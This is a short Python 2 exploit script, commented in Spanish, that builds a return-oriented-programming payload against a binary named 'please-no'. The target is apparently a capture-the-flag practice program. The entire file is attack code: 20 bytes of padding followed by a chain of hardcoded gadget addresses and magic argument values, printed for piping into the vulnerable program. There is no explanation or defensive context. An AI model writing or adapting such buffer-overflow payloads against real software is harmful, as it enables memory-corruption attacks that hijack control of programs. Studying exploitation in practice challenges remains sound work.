#!/usr/bin/python
# Fichero pwn_please_no.py 
# Exploit ROP

 
from struct import pack
 
binary = "please-no"
junk = "A" * 20

rop = pack('<I', 0x8048690)   
rop += pack('<I', 0x8048601)    
rop += pack('<I', 0x1B0B0C41)   
rop += pack('<I', 0xAE13374E)   
rop += pack('<I', 0xdeadbeef)   
rop += pack('<I', 0x8048650)   
rop += pack('<I', 0x80483c9)  
rop += pack('<I', 0xB0B01337)   
rop += pack('<I', 0x8048590)
rop += pack('<I', 0x08048420)

payload = junk + rop 
print payload

# Fin fichero pwn_please_no.py
